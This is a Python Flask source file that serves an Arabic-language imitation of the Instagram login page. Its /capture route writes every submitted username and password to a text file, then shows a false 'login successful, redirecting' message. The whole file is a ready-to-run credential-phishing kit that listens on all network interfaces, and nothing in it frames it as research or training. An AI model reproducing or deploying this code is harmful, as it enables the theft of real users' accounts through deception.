from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تسجيل الدخول • Instagram</title>
        <style>
            body { background-color: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 320px; text-align: center; border-radius: 4px; }
            h1 { font-family: cursive; font-size: 35px; margin-bottom: 30px; color: #262626; font-weight: normal; }
            input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 6px; border-radius: 3px; font-size: 12px; box-sizing: border-box; outline: none; }
            button { background-color: #0095f6; color: white; border: none; width: 100%; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>Instagram</h1>
            <form action="/capture" method="POST">
                <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
                <input type="password" name="password" placeholder="كلمة السر" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    
    with open('captured_accounts.txt', 'a', encoding='utf-8') as f:
        f.write(f"Username: {username} | Password: {password}\n")
        
    return "<h2 style='text-align:center; margin-top:50px; font-family:Arial;'>تم تسجيل الدخول بنجاح، جاري التحويل...</h2>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

